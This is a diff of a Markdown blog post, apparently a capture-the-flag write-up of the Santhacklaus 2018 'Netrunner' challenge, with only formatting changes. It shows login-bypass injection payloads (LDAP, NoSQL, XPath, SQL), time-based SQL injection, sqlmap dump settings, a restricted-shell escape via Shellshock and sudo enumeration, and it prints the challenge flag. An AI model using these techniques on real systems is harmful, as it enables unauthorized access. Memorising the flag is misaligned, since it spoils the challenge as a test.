@@ -9,22 +9,18 @@ nopaging = "true"
 
 Netrunner is the second biggest challenge of the Santhacklaus 2018 CTF. The challenge is not really hard, but could be particulary annoying if you don't know what to do. You need to have some skills in pentest web and medium skills in Linux system.
 
-The challenge is divided in 3 steps. Each step has its own validation password (flag). So let's begin with the first step ! 
+The challenge is divided in 3 steps. Each step has its own validation password (flag). So let's begin with the first step !
 
-![](/img/santhacklaus/netrunner1.png "")
+![](/img/santhacklaus/netrunner1.png)
 
+# 1st step - You have a mission !
 
-
-
-## 1st step - You have a mission !
-
-![](/img/santhacklaus/netrunner2.png "")
+![](/img/santhacklaus/netrunner2.png)
 
 Well received ! Mission accepted, let's save the world !
 Fire your favorite web browser and navigate to http://santhacklaus.xyz:2077/
 
-![](/img/santhacklaus/netrunner3.png "")
-
+![](/img/santhacklaus/netrunner3.png)
 
 Humm authentication page. Let's inspect that.
 
@@ -32,7 +28,7 @@ Humm authentication page. Let's inspect that.
 
 So open Burp to do traffic interception. Submit something in the form and send the request to repeater section in Burp.
 
-![](/img/santhacklaus/netrunner4.png "")
+![](/img/santhacklaus/netrunner4.png)
 
 Ok that's better ! So what can we see ?
 
@@ -42,14 +38,14 @@ Ok that's better ! So what can we see ?
 
 Ok but what am I supposed to do now ? Take a breath and read the OWASP Testing Guide : https://www.owasp.org/index.php/Web_Application_Security_Testing_Cheat_Sheet
 
-Here some work with most famous injection : 
+Here some work with most famous injection :
 
 - Test for LDAP Injection : https://www.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-006)
 - Test for NoSQL injection : https://www.owasp.org/index.php/Testing_for_NoSQL_injection
 - Test for XPath Injection : https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010)
 - Test for SQL Injection : https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)
 
-### Test for LDAP Injection
+## Test for LDAP Injection
 
 First, try if the application is vulerable to LDAP injection with the help of owasp guide
 If an application uses LDAP in its user authentication process, and is vulnerable to LDAP injection, it can be bypassed by injecting an LDAP query that will always be true (similar to SQL and XPATH injections).
@@ -64,6 +60,7 @@ Using the following values:
 user = johnDoe)(&)
 pass = password
 ```
+
 The search filter becomes:
 
 `searchlogin = "(&(USER = johnDoe)(&))(PASSWORD = pass))"`
@@ -72,12 +69,11 @@ Only the first portion of this query is processed by the LDAP server `(&(USER = 
 
 Thanks wikipédia ! Let's try this. Here is an example of what you can try.
 
-![](/img/santhacklaus/netrunner5.png "")
+![](/img/santhacklaus/netrunner5.png)
 
 Humm not seem effective. Let's try an other injection.
 
-
-### Test for NoSQL Injection
+## Test for NoSQL Injection
 
 NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits.
 
@@ -87,14 +83,13 @@ It's really easy to detect. Look at the query below. The `[$ne]` string mean not
 
 Test this !
 
-![](/img/santhacklaus/netrunner7.png "")
+![](/img/santhacklaus/netrunner7.png)
 
 Sad :(
 
-### Test for XPath 
+## Test for XPath
 
 XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents. The exploitation is Similar to SQL.
-
 
 An XPath query that returns the account whose username is `th1b4ud` and the password is `p4sSw0rD` would be the following:
 
@@ -103,8 +98,8 @@ An XPath query that returns the account whose username is `th1b4ud` and the pass
 If the application does not properly filter user input, the tester will be able to inject XPath code and interfere with the query result. For instance, the tester could input the following values:
 
 ```
-Username: ' or '1' = '1 
-Password: ' or '1' = '1 
+Username: ' or '1' = '1
+Password: ' or '1' = '1
 ```
 
 Looks quite familiar, doesn't it? Using these parameters, the query becomes:
@@ -115,11 +110,11 @@ As in a common SQL Injection attack, we have created a query that always evaluat
 
 So let's try this !
 
-![](/img/santhacklaus/netrunner6.png "")
+![](/img/santhacklaus/netrunner6.png)
 
 Humm, maybe it's not XPath behind.
 
-### Test for SQL Injection
+## Test for SQL Injection
 
 An SQL injection attack consists of insertion or "injection" of either a partial or complete SQL query via the data input or transmitted from the client (browser) to the web application. Maybe it will work (I hope !!!)
 
@@ -127,7 +122,7 @@ Consider the following SQL query:
 
 `SELECT * FROM Users WHERE Username='$username' AND Password='$password'`
 
-A similar query is generally used from the web application in order to authenticate a user. If the query returns a value it means that inside the database a user with that set of credentials exists, then the user is allowed to login to the system, otherwise access is denied. 
+A similar query is generally used from the web application in order to authenticate a user. If the query returns a value it means that inside the database a user with that set of credentials exists, then the user is allowed to login to the system, otherwise access is denied.
 
 ```
 $username = 1' or '1' = '1
@@ -151,15 +146,15 @@ username=th1b4ud&password=password' OR SLEEP(3)#&login=Login
 username=th1b4ud' OR SLEEP(3)#&password=password&login=Login
 ```
 
-![](/img/santhacklaus/netrunner1.gif "")
+![](/img/santhacklaus/netrunner1.gif)
 
-![](https://media.giphy.com/media/WuGSL4LFUMQU/giphy.gif "")
+![](https://media.giphy.com/media/WuGSL4LFUMQU/giphy.gif)
 
 HOHO ! We found something ! We've got a sql injection vulnerability in the username ! Nice ! It's time to confirm that there is a mysql database behind the application.
 
 {{< protips "You start to know me, I love to use cheatsheet. This on is nice to explore sql injection : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20injection" >}}
 
-![](/img/santhacklaus/netrunner2.gif "")
+![](/img/santhacklaus/netrunner2.gif)
 
 Nice this is MySql. So I imagine the php code behind will do advanced check to avoid to pass throught with `' OR 1=1#` injection. But I think it's the good moment to show you how to use Sqlmap with time based sql injection.
 
@@ -174,7 +169,7 @@ So what do we have to set to Sqlmap :
 - **Vulnerable field (`-p`)** : `"username"`
 - **HTTP method (`--method`)** : `POST`
 - **SQL Injection technique (`--technique`)** : `T` for Time-Based
-- **Level agressivity (`--level`)** : `5` maximum (sorry for the DOS :$)
+- **Level agressivity (`--level`)** : `5` maximum (sorry for the DOS :\$)
 - **Dangerousness for database integrity (`--risk`)** : `2` (3 is the maximum and can lead to an update of all the entries of the table)
 - **Database engine (`--dbms`)** : `mysql`
 - **Action to perform** : dump the database with `--dump`
@@ -226,21 +221,19 @@ puppet-master'#
 
 With admin
 
-![](/img/santhacklaus/netrunner8.png "")
+![](/img/santhacklaus/netrunner8.png)
 
 Sad :(
 
-![](/img/santhacklaus/netrunner9.png "")
+![](/img/santhacklaus/netrunner9.png)
 
 ![](https://media.giphy.com/media/3o6UB3VhArvomJHtdK/giphy.gif)
 
 OMG IT WORKS !
 
+# 2nd step - Bypass protection
 
-
-## 2nd step - Bypass protection
-
-![](/img/santhacklaus/netrunner10.png "")
+![](/img/santhacklaus/netrunner10.png)
 
 We've got an access to the application. We now have an access to this page : http://santhacklaus.xyz:2077/e91ac60004c77904ad889a5762a68b06e53b7c21.html
 
@@ -341,7 +334,7 @@ Connection to 51.75.202.113 closed.
 Ho ! Connection closed ! Maybe we have to bypass a restricted shell or a similar protection.
 Lets type the question to Google : `escape restricted shell` and click on the first link : https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells
 
-Look at the ninth slide : 
+Look at the ninth slide :
 
 ```bash
 # Use SSH on your machine to execute commands before the remote shell is loaded
@@ -384,13 +377,12 @@ No
 
 
 Do not use Zetatech maintenance interface if you are not authorized by Zetatech Corporation.
-puppet-master@2a87f3ade358:~$ 
+puppet-master@2a87f3ade358:~$
 ```
 
 WUT ? O.O
 
 ![](https://media.giphy.com/media/aWPGuTlDqq2yc/giphy.gif)
-
 
 Stop, stop, stop ! Shellshock ?!? Really ?!?
 
@@ -419,7 +411,7 @@ And what is `-t` argument in ssh ?
 With `-t` argument you can execute arbitrary programs on the server. Perfect for us ! The host is vulnerable to shellshock, so we can abuse this ssh feature to exploit the Shellshock vulnerability to obtain a shell \o/
 
 ```
-puppet-master@2a87f3ade358:~$ cat client.note 
+puppet-master@2a87f3ade358:~$ cat client.note
 
 .___..___.___..__..___..___ __ .  .
   _/ [__   |  [__]  |  [__ /  `|__|
@@ -439,19 +431,16 @@ Note: the password is the same than your username.
 
 Go to the next and last step !
 
+# 3rd step - Nice exfiltration !
 
-
-## 3rd step - Nice exfiltration !
-
-![](/img/santhacklaus/netrunner11.png "")
+![](/img/santhacklaus/netrunner11.png)
 
 Look at the file `client.note`. It say : `Note: the password is the same than your username.`
 Why is necessary to know the user password ? To be able to execute sudo !!!
 
-
 ```
 puppet-master@2a87f3ade358:~$ sudo -l
-[sudo] password for puppet-master: 
+[sudo] password for puppet-master:
 Matching Defaults entries for puppet-master on 2a87f3ade358:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, lecture=never
 
@@ -531,7 +520,7 @@ Branch the Zetatech Pad to Cybernetic Prosthetic client and use the following ge
 :: IMTLD{Wh3r3_d03s_HuM4n1tY_3nd}
 ```
 
-## Conclusion
+# Conclusion
 
 So what do we learned with this challenge ?
 
@@ -543,4 +532,3 @@ So what do we learned with this challenge ?
 Thanks again to the Santhacklaus CTF Team for all their challenges !
 
 Th1b4ud
-
